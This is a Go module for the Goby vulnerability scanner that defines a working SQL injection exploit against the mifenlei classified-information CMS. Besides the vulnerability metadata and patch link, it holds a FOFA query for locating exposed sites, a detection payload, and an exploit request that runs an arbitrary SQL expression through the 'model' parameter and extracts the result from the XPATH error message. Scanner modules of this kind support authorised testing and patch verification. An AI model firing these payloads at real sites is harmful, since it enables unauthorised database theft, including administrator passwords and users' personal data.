package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "mifenlei system index-api-edit interface SQL injection vulnerability",
    "Description": "<p>mifenlei information system is a CMS system mainly based on information release and navigation.</p><p>There is a SQL injection vulnerability in the model parameter of the index-api-edit interface of the Find mifenlei System version before V2.5.</p>",
    "Product": "mifenlei",
    "Homepage": "https://www.mifenlei.com/",
    "DisclosureDate": "2022-09-18",
    "Author": "sharecast",
    "FofaQuery": "body=\"/template/mifenlei/\" || body=\"mifenlei.css\"",
    "GobyQuery": "body=\"/template/mifenlei/\" || body=\"mifenlei.css\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.mifenlei.com/shengji.html\">https://www.mifenlei.com/shengji.html</a></p>",
    "References": [
        "http://124.223.89.192/archives/mflgetshell"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "database()",
            "show": ""
        }
    ],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index-api-edit.html",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "model=file where 1=extractvalue(1,md5(0x5c))-- asd&id=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "d397e87306b8631f3ed80d858d35f0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "觅分类系统 index-api-edit 接口 SQL 注入漏洞",
            "Product": "觅分类系统",
            "Description": "<p>觅分类信息系统是一个以信息发布导航为主的CMS系统。<br></p><p>觅分类系统&nbsp;V2.5&nbsp;之前版本&nbsp;index-api-edit 接口 的model参数存在SQL注入漏洞。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://www.mifenlei.com/shengji.html\">https://www.mifenlei.com/shengji.html</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "mifenlei system index-api-edit interface SQL injection vulnerability",
            "Product": "mifenlei",
            "Description": "<p>mifenlei&nbsp;information system is a CMS system mainly based on information release and navigation.</p><p>There is a SQL injection vulnerability in the model parameter of the index-api-edit interface of the Find mifenlei&nbsp;System version before V2.5.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.mifenlei.com/shengji.html\">https://www.mifenlei.com/shengji.html</a></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index-api-edit.html",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "model=file where 1=extractvalue(1,concat(0x7e,({{{sql}}}),0x7e))-- asd&id=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: '~(.*?)~'"
            ]
        }
    ],
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}